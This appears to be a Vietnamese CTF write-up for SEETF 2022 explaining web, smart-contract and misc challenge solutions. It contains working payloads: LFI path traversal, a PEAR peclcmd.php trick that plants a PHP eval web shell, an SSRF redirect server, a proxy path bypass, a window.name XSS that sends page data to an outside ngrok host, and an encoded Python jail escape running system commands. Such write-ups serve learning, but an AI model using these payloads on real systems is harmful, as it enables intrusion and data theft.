# SEECTF 20222
Write up nhằm ép mình hiểu bản vấn đề và giải thích + repoduce lại các bài CTF(đã/chưa làm được). Để tổng quát, dễ hiểu hơn xin tham khảo: https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2022/web

**Source code**: https://github.com/devme4f/ctf-writeup/tree/main/SEECTF-2022/Source-code

# Mục Lục

Sourceless Guessy Web (Baby Flag):

Sourceless Guessy Web (RCE Flag):

Super Secure Requests Forwarder:

Flag Portal (Flag 1):

Flag 2:

Username Generator:

The Pigeon Files:

Star Cereal Episode 3: The Revenge of the Breakfast:

Log4Security:

Charlotte's Web:

XSPwn:

Web3 - Bonjour: 

Misc - Angry Zeyu2001: 

Misc- "as" "df":

# WEB

## Sourceless Guessy Web (Baby Flag)

![Screenshot (897)](https://user-images.githubusercontent.com/71699412/172428070-83826197-6374-4f8f-8bbe-d5c90667ab54.png)

LFI cổ điển, payload:
```
http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../etc/passwd
```
**flag**: `SEE{2nd_fl4g_n33ds_RCE_g00d_luck_h4x0r}`

## Sourceless Guessy Web (RCE Flag)

![Screenshot (898)](https://user-images.githubusercontent.com/71699412/172428094-6f83dd36-d541-45f8-b2a6-6578f4aa53f7.png)

Đến bài này ta cần RCE để lấy được flag, ở main page nó có cho đọc 1 trang `phpinfo()` và show luôn ra rằng: `register_argc_argv:	On`

**Làm đường google dork**: `intext:register_argc_argv & intext:ctf`

**found**: https://ctftime.org/writeup/30236

Với chall này `register_argc_argv` được bật `On` ở `php.ini`(mặc định ở PHP mấy bản cũ 5.2.17< sẽ bật On, còn mấy bản mới hơn thường Off) và `peclcmd.php` cũng nằm trong `/usr/local/lib/php/`(Ta có thể test bằng cách include `peclcmd.php`).

Phân tích lỗi sâu hơn: https://chowdera.com/2022/01/202201071654034352.html

**Tóm tắt**: 

1. Khi `register_argc_argv` được bật thì script được chạy từ CLI sẽ access đến được các biến này(các biến này thuộc global variable($\_SERVER)), tức `php test.php $argc[2]`, từ url, các biến được phân cách bằng `+` thay vì `&`.

2. `pear` là 1 kho thư viện mở rộng cho php, với `peclcmd.php` ta có thể dùng script này để tải các thư viện, extension mới cho php. 

=> Lợi dụng LFI ta có thể include `peclcmd.php` + với `register_argc_argv: On` ta có thể điều kiển các biến như là thực thi `peclcmd.php` ở CLI.

**EXPLOIT**:

![Screenshot (899)](https://user-images.githubusercontent.com/71699412/172428144-a2c39568-b63f-4ea8-9041-2ccf4e31121c.png)

```
?page=../../../usr/local/lib/php/peclcmd.php&+config-create+/RESULT/<?=eval($_POST[1]);?>/RESULT/*+/tmp/devme.php
```
Lưu ý tránh các kí tự đặc biệt như `'`, `"` hay dấu `space` để tránh bị urlencode từ đó payload không chạy được. Vì thế ta dùng tạm hàm `eval()` rồi mới nạp `system()` vào để RCE.

![Screenshot (900)](https://user-images.githubusercontent.com/71699412/172428186-6f186f37-c00b-416a-9207-ac50b63f4266.png)

```
?page=../../../tmp/devme.php
```

**flag**: `SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}`

## Super Secure Requests Forwarder
Bài hint sẵn SSRF

**Source code**: `app.py`
```python
from flask import Flask, request, render_template
import os
import advocate # 1.0.0
import requests

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def index():
 
    if request.method == 'POST':x
        url = request.form['url']

        # Prevent SSRF
        try:
            advocate.get(url)

        except Exception as e:
            return render_template('index.html', error=str(e))

        r = requests.get(url)
        return render_template('index.html', result=r.text)

    return render_template('index.html')


@app.route('/flag')
def flag():
    if request.remote_addr == '127.0.0.1':
        return render_template('flag.html', FLAG=os.environ.get("FLAG"))

    else:
        return render_template('forbidden.html'), 403


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80, threaded=True, debug=True)

```

Tưởng phải bypass module `advocate`(chống SSRF từ redirect đến dns rebinding) của python trong khi không tìm nổi 1 security issue hay CVE nào.

Tuy nhiên bài này phải dùng hacker brain, đọc kĩ source code ta phân tích được:

1. url đi qua hàm `advocate.get()` nếu nghi url trỏ về localhost sẽ raise error và return về, nếu không -> step 2.
2. url được `requests.get()` bình thường.

Vậy ta thấy ở đây nó request tận 2 lần, 1 lần để check, lần sau get thật. Vậy ta chỉ cần tạo 1 server sẵn sàng redirect mà lần thứ nhất sẽ trả về kết quả bình thường, lần 2 lại redirect đến localhost.

`main.py` host tại server :
```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)    

times = 0

@app.route('/')    
def root():
    global times

    if times == 0:
        times+= 1
        return "Harmless website, let me in advocate!!"
    
    return redirect("http://localhost/flag", code=302)
    
if __name__ == "__main__":    
    app.run(debug=True, host="0.0.0.0", port=8989)
```

Mình không hề nghĩ đến khiến server trả về response cho mỗi request là khác nhau được, haiz!!

**flag**: `SEE{y0u_m34n_7h3_53rv3r_r35p0n53_c4n_ch4n63?_369e7e3531c987fa4a4c9cfd4f97f2f6}`

## Flag Portal (Flag 1)

Chall có 2 app chính, 1 cái đứng sau reverse proxy(python server)

`server.py`:
```python
from waitress import serve
from flask import Flask, request

import os, requests

app = Flask(__name__)

@app.route('/')
def index():
    return 'Hello World!'

@app.route('/flag-count')
def flag_count():
    return '2'

@app.route('/flag-plz', methods=['POST'])
def flag():
    if request.headers.get('ADMIN_KEY') == os.environ['ADMIN_KEY']:
        if 'target' not in request.form:
            return 'Missing URL'

        requests.post(request.form['target'], data={
            'flag': os.environ['SECOND_FLAG'],
            'congrats': 'Thanks for playing!'
        })

        return 'OK, flag has been securely sent!'
            
    else:
        return 'Access denied'

@app.route('/forbidden')
def forbidden():
    return 'Forbidden', 403

serve(app, host='0.0.0.0', port=80, debug=True) # them debug
```

`server.rb`:
```ruby
require 'net/http'

class Server
    def call(env)
        req = Rack::Request.new(env)
 
        path = req.path
        
        if path == '/'
            return [200, {"Content-Type" => "text/html"}, [
                "<html><body>" +
                "There are <span id='count'></span> flags for you to capture here. Have fun!" +
                "<script>fetch('/api/flag-count').then(resp => resp.text()).then(data => document.getElementById('count').innerText = data)</script>" +
                "</body></html>"
            ]]

        elsif path == '/admin'
            params = req.params
            flagApi = params.fetch("backend", false) ? params.fetch("backend") : "http://backend/flag-plz"
            puts flagApi # debug
            target = "https://bit.ly/3jzERNa"

            uri = URI(flagApi)
            req = Net::HTTP::Post.new(uri)
                req['Admin-Key'] = ENV.fetch("ADMIN_KEY")
                req['First-Flag'] = ENV.fetch("FIRST_FLAG")
                req.set_form_data('target' => target)

                res = Net::HTTP.start(uri.hostname, uri.port) {|http|
                http.request(req)
            }

            resp = res.body

            return [200, {"Content-Type" => "text/html"}, [resp]]

        elsif path == '/forbidden'
            return [403, {"Content-Type" => "text/html"}, ["You're not allowed in here."]]

        else
            return [404, {"Content-Type" => "text/html"}, ["Not Found"]]
        end
    end
end
```

`remap.config`:
```
map /api/flag-plz   http://backend/forbidden
map /api            http://backend/
map /admin          http://flagportal/forbidden
map /               http://flagportal/
```

Ở đây để lấy flag1 ta chỉ cần request đến `/admin?backend=ngrok` là server sẽ gửi flag đến `backend` trong header, tuy nhiên `/admin` thì bị block ngay

Nó định tuyến bằng apache `trafficserver-9.0.0`(Dockerfile), qua tìm hiểu thì phiên bản này có dính `CVE-2021-27577`: https://security.snyk.io/vuln/SNYK-UNMANAGED-TRAFFICSERVER-2382217

Tuy nhiên CVE này chỉ được explain qua loa, chưa có bài phân tích chi tiết nên trình mình bó tay, tuy nhiêm làm được unintended solution bởi file `remap.config` misconfiguration.

**Tham khảo**: https://nhienit.wordpress.com/2022/03/04/write-up-nimja-at-nantou-tsj-ctf-2022/

**Ví dụ**: Khi request nó sẽ map như sau, lưu ý để exploit phải hiểu bản chất và đọc document nhiều lên: https://docs.trafficserver.apache.org/en/9.1.x/admin-guide/files/remap.config.en.html
```
http://domain/ ==> http://flagportal/
http://domain/a/b ==> http://flagportal/a/b
```
Vậy nếu:
```
http://domain//admin ==> http://flagportal//admin
```
Mà path:
```
//admin # /admin
```
Ta map đến được:
```
http://flagportal//admin == http://flagportal/admin
```

Nên ta dễ dàng bypass

![Screenshot (901)](https://user-images.githubusercontent.com/71699412/172428358-701501cf-e294-48d5-ba8a-c2272f57572a.png)

**response**:
![Screenshot (902)](https://user-images.githubusercontent.com/71699412/172428383-36aa7d88-fd6a-46a2-8f21-e6ab952721e4.png)

**flag**: `
SEE{n0w_g0_s0lv3_th3_n3xt_p4rt_bf38678e8a1749802b381aa0d36889e8}`

Ngoài ra nó gửi thêm header `admin-key` cho `Flag Portal (Flag 2)`

## Flag Portal (Flag 2)

1. Bài này tiếp nối `Flag Portal (Flag 1)`, nay ta chỉ cần POST đến thẳng endpoint `/api//flag-plz`(Do `/api` sẽ map đến `http://backend/` nên `/api//flag-plz` đến `http://api//flag-plz`). Từ đây ta bypass được `target` bị gán chặt với link rút gọn rick roll nếu request từ `/admin`, đây có lẽ cũng unintended.

![Screenshot (904)](https://user-images.githubusercontent.com/71699412/172428770-3fd785c7-805b-4d22-9b24-59c299cb3a1c.png)

Ta cho thêm header `admin-key` + `Content-Type: application/x-www-form-urlencoded` header(không có - không nhận url)

![Screenshot (905)](https://user-images.githubusercontent.com/71699412/172428807-0e0e8ef9-eb54-4902-80ab-689619d8993c.png)

**flag**: `SEE{y4y_r3qu3st_smuggl1ng_1s_fun_e28557a604fb011a89546a7fdb743fe9}`

## Flag 1

CVE HTTP request smuggling

## Flag 2

pass

## Username Generator

if(usernameLength > 0): Thì khi usernameLength = 0 biến `{name}` sẽ không được khai báo, từ nó đó sẽ nhận biến toàn cục là `window.name`. `window.name` là biến toàn cục trong javascript chỉ đến tên của tab(window) hiện tại vì thế với payload kiểu: `window.open('/', 'fetch('url').then(response => response.text()).then(fetch("ngrok"+response))')`

## The Pigeon Files

## Star Cereal Episode 3: The Revenge of the Breakfast

## Log4Security

## Charlotte's Web

## XSPwn

# WEB3 - SMART CONTRACTS

## Bonjour

Cho ip và port để `nc` đến.

1. Tạo account
2. Tạo contract
3. Get flag
4. Show source code

```python
from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware

import solcx

# solcx.install_solc(version='latest'): install solc for compiling the code to get bytecode and abi
compiled_sol = solcx.compile_source(
        '''
        // SPDX-License-Identifier: MIT
        pragma solidity ^0.8.0;

        contract Bonjour {

          string public welcomeMessage;

          constructor() {
            welcomeMessage = "Bonjour";
          }

          function setWelcomeMessage(string memory _welcomeMessage) public {
            welcomeMessage = _welcomeMessage;
          }

          function isSolved() public view returns (bool) {
            return keccak256(abi.encodePacked("Welcome to SEETF")) == keccak256(abi.encodePacked(welcomeMessage));
          }
        }
        ''',
        output_values=['abi', 'bin']
    )
contract_id, contract_interface = compiled_sol.popitem()
bytecode = contract_interface['bin']
abi = contract_interface['abi'] # You can used http://remix.ethereum.org/ to generate the ABI for me from the source code, this allows web3 to know what kind of functions exist in the contract, what those function return, etc.
contract_address = '0xa973c1FD79409E0e76318Aa907ecd682f515f0A1' # The address of the contract

w3 = Web3(Web3.HTTPProvider('http://awesome.chall.seetf.sg:40002')) # Instead of running a local node to connect to the Rinkeby network, I used https://infura.io/
w3.middleware_onion.inject(geth_poa_middleware, layer=0) # Some stuff StackOverflow told me to add after I got errors
w3.eth.default_account = w3.eth.accounts[0]
contract = w3.eth.contract(contract_address, abi=abi)

tx_hash = contract.functions.setWelcomeMessage("Welcome to SEETF").transact()
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(contract.functions.isSolved().call())
```
**Tham khảo**:
https://web3py.readthedocs.io/en/stable/contracts.html#invoke-ambiguous-contract-functions-example

https://ctftime.org/writeup/25917

**flag**: `SEE{W3lc0mE_t0_SEETF_a71cda2f322e7834169418a9d1a036a0}`
# MISCELLANEOUS

## Angry Zeyu2001
Ok vợ tôi xé ticket, bạn ghép lại là được flag.

Chall cho tầm trăm file pixel ảnh với tên tựa `000.010.jpg`, `020.000.jpg`,.. tựa thế.

1. Cho `000.` là các hàng
2. `.000.jpg` là các cột

Ta dùng command `convert` trong linux, tham khảo: https://stackoverflow.com/questions/20075087/how-to-merge-images-in-command-line

`scripts.py`
```python
import os

# Ghép tạo ra 6 mảnh
for here in range(6):
	# Ghép hàng ngang từ 0-9
	for i in range(0, 10):
		os.system(f'convert {here}{i}0.*.jpg -append result/hor{i}.jpg')

	# Ghép hàng cột từ 10 hàng ngang
	for i in range(0, 10):
		os.system(f'convert result/hor*.jpg +append result/half/done{here}.jpg')

# Ghép 6 mảnh lại với nhau
for i in range(1, 6):
	os.system(f'convert result/half/done*.jpg +append result/half/finished.jpg') 
```

![flag](https://user-images.githubusercontent.com/71699412/172428844-6ab27086-6b1d-490f-9e2d-5aa65aedb624.jpg)

**flag**: `SEE{boss_aint_too_happy_bout_me_9379c958d872435}`
## "as" "df"

Là 1 bài `pwn` nhưng thật ra rất giống web, keyword google dork là: `python escape jail`.

Ở đây nó chỉ cho 1 ip và port chỉ để nc đến, nc đến là 1 shell python bị block hầu hết các keyword để RCE. Ngoài ra ta dùng được hàm `print()`.

`dir()`: This function will return all the `properties and methods`, even `built-in properties` which are default for `all object`.

Ngon, vậy:
```python
print(dir())
# ['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'blacklist', 'sys', 'user_input']

print(blacklist)
# ('eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', ';', '+', 'ord', 'chr', 'base', 'flag', 'replace', ' ', 'decode', 'join')
```

Đáng chú ý có module `__builtins__`, module này gồm rất nhiều object hữu ích, để liệt kê nó có gì;
```python
print(dir(__builtins__))
#  .......... 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
```
Được rất nhiều properties, đáng  chú ý nhất chắc chắn là hàm `__import__` tuy nhiên đã bị blocked.

Để bypass rất đơn giản, chỉ cần encode qua dạng string literal hexadecimal là được bởi python có hỗ trợ.

Cuối cùng ta build được payload lấy flag;
```python
print(__builtins__.__dict__['__import__']('os').__dict__['system']('cat /flag'))
```

`__dict__`: https://stackoverflow.com/questions/48029249/python-dict

`__dict__`: contains the dynamic attributes of an object. Mình có thể dùng `__dict__` để lấy list các attributes của object rồi chọn nó(hoặc có thể dùng `__getattribute__` cũng được).

Payload sau khi encode:
```python
print(__builtins__.__dict__['__\x69\x6d\x70\x6f\x72\x74__']('\x6f\x73').__dict__['\x73\x79\x73\x74\x65\x6d']('cat\x20/\x66lag'))
```

**flag**: `SEE{every_ctf_must_have_a_python_jail_challenge_836a4218fb09b4a0ab0412e64de74315}`
